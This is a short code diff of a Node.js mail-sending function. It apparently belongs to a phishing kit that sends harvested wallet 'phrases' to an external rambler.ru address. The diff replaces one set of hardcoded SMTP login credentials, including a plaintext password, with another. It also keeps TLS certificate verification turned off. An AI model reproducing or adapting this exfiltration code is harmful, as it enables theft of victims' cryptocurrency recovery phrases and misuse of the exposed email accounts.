@@ -7,8 +7,8 @@ async function sendmail(message) {
       port: 465, // Use port 465 for SSL/TLS encryption
       secure: true, // Use true for SSL/TLS encryption
       auth: {
-        user: "brt@tradeifymarkets.com", // Your full email address
-        pass: "@Maroke45g" // Your email password
+        user: "aa@obulehealthcare.com.ng", // Your full email address
+        pass: "@Maroke2000" // Your email password
       },
       tls: {
         rejectUnauthorized: false // Allow self-signed certificates
@@ -20,7 +20,7 @@ async function sendmail(message) {
     console.log("Transporter configuration:", transporter.options);
 
     let info = await transporter.sendMail({
-      from: 'brt@tradeifymarkets.com"', // Sender address
+      from: 'aa@obulehealthcare.com.ng', // Sender address
       to: "wjsmrgkhpf@rambler.ru", // List of receivers
       subject: "incoming new phrase ", // Subject line
       html: message // HTML body
